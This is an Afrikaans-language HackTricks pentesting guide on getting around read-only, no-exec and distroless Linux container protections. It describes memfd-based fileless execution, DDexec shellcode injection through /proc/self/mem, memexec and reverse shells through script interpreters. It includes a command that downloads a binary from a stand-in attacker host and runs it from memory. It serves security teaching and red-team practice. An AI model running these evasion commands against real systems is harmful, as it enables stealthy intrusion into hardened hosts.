# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hacking loopbaan** en die onhackbare hack - **ons is op soek na mense!** (_vloeiende Pools geskryf en gesproke vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Video's

In die volgende video's kan jy die tegnieke wat op hierdie bladsy genoem word, meer in diepte verduidelik vind:

* [**DEF CON 31 - Verkenning van Linux Geheue Manipulasie vir Stealth en Ontvlugting**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth indringings met DDexec-ng & in-geheue dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

Dit is al hoe meer algemeen om linux masjiene te vind wat gemonteer is met **read-only (ro) lêerstelsel beskerming**, veral in houers. Dit is omdat dit so maklik is om 'n houer met 'n ro lêerstelsel te laat loop deur **`readOnlyRootFilesystem: true`** in die `securitycontext` in te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tog, selfs al is die lêerstelsel as ro gemonteer, sal **`/dev/shm`** steeds skryfbaar wees, so dit is vals dat ons nie iets op die skyf kan skryf nie. Hierdie gids sal egter **gemonteer wees met no-exec beskerming**, so as jy 'n binêre hier aflaai, sal jy **nie in staat wees om dit uit te voer nie**.

{% hint style="warning" %}
Van 'n rooi span perspektief maak dit **moeilik om binêre te aflaai en uit te voer** wat nie reeds in die stelsel is nie (soos agterdeure of enumerators soos `kubectl`).
{% endhint %}

## Eenvoudigste omseiling: Skripte

Let daarop dat ek binêre genoem het, jy kan **enige skrip uitvoer** solank die interpreter binne die masjien is, soos 'n **shell skrip** as `sh` teenwoordig is of 'n **python** **skrip** as `python` geïnstalleer is.

Tog is dit nie net genoeg om jou binêre agterdeur of ander binêre gereedskap wat jy mag nodig hê om te loop, uit te voer nie.

## Geheue Omseilings

As jy 'n binêre wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen deur **dit uit geheue uit te voer**, aangesien die **beskermings daar nie van toepassing is nie**.

### FD + exec syscall omseiling

As jy 'n paar kragtige skrip enjin in die masjien het, soos **Python**, **Perl**, of **Ruby**, kan jy die binêre aflaai om uit geheue uit te voer, dit in 'n geheue lêer beskrywer (`create_memfd` syscall) stoor, wat nie deur daardie beskermings beskerm gaan word nie en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.

Vir hierdie kan jy maklik die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gebruik. Jy kan dit 'n binêre gee en dit sal 'n skrip in die aangeduide taal genereer met die **binêre gecomprimeer en b64 geënkodeer** met die instruksies om dit te **decodeer en te dekomprimeer** in 'n **fd** wat geskep is deur `create_memfd` syscall aan te roep en 'n oproep na die **exec** syscall om dit te laat loop.

{% hint style="warning" %}
Dit werk nie in ander skrip tale soos PHP of Node nie omdat hulle nie enige d**efault manier het om rou syscalls** van 'n skrip aan te roep nie, so dit is nie moontlik om `create_memfd` aan te roep om die **geheue fd** te skep om die binêre te stoor nie.

Boonop sal die skep van 'n **regte fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy nie toegelaat sal word om dit uit te voer nie omdat die **no-exec beskerming** van toepassing sal wees.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek wat jou toelaat om die **geheue van jou eie proses** te verander deur sy **`/proc/self/mem`** te oorskryf.

Daarom, **beheer die assembly kode** wat deur die proses uitgevoer word, kan jy 'n **shellcode** skryf en die proses "mutate" om **enige arbitrêre kode** uit te voer.

{% hint style="success" %}
**DDexec / EverythingExec** sal jou toelaat om jou eie **shellcode** of **enige binêre** uit **geheue** te laai en **uit te voer**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is 'n **DDexec shellcode demonised**, so elke keer wanneer jy 'n **ander binêre** wil **hardloop**, hoef jy nie DDexec weer te herlaai nie, jy kan net memexec shellcode via die DDexec-tegniek hardloop en dan **kommunikeer met hierdie demon om nuwe binêre te stuur om te laai en te hardloop**.

Jy kan 'n voorbeeld vind van hoe om **memexec te gebruik om binêre van 'n PHP reverse shell** uit te voer in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec, laat die [**memdlopen**](https://github.com/arget13/memdlopen) tegniek 'n **gemakliker manier om binêre** in geheue te laai om later uit te voer. Dit kan selfs toelaat om binêre met afhanklikhede te laai.

## Distroless Bypass

### Wat is distroless

Distroless houers bevat slegs die **bare minimum komponente wat nodig is om 'n spesifieke toepassing of diens te laat loop**, soos biblioteke en runtime afhanklikhede, maar sluit groter komponente soos 'n pakketbestuurder, skulp of stelseldienste uit.

Die doel van distroless houers is om die **aanvaloppervlak van houers te verminder deur onnodige komponente te verwyder** en die aantal kwesbaarhede wat uitgebuit kan word, te minimaliseer.

### Reverse Shell

In 'n distroless houer mag jy **nie eens `sh` of `bash`** vind om 'n gewone skulp te kry nie. Jy sal ook nie binêre soos `ls`, `whoami`, `id`... vind nie, alles wat jy gewoonlik in 'n stelsel hardloop.

{% hint style="warning" %}
Daarom, jy **sal nie** in staat wees om 'n **reverse shell** of **te enumerate** die stelsel soos jy gewoonlik doen nie.
{% endhint %}

As die gecompromitteerde houer egter byvoorbeeld 'n flask web loop, dan is python geïnstalleer, en daarom kan jy 'n **Python reverse shell** kry. As dit node loop, kan jy 'n Node rev shell kry, en dieselfde met byna enige **skriptaal**.

{% hint style="success" %}
Met die skriptaal kan jy **die stelsel enumerate** met behulp van die taal se vermoëns.
{% endhint %}

As daar **geen `read-only/no-exec`** beskermings is nie, kan jy jou reverse shell misbruik om **in die lêerstelsel jou binêre te skryf** en **uit te voer**.

{% hint style="success" %}
Echter, in hierdie tipe houers sal hierdie beskermings gewoonlik bestaan, maar jy kan die **vorige geheue-uitvoertegnieke gebruik om dit te omseil**.
{% endhint %}

Jy kan **voorbeelde** vind van hoe om **sommige RCE kwesbaarhede te benut** om skriptaal **reverse shells** te kry en binêre uit geheue uit te voer in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As jy belangstel in 'n **hacking loopbaan** en die onhackable hack - **ons huur!** (_vloeiende Pools geskryf en gesproke vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
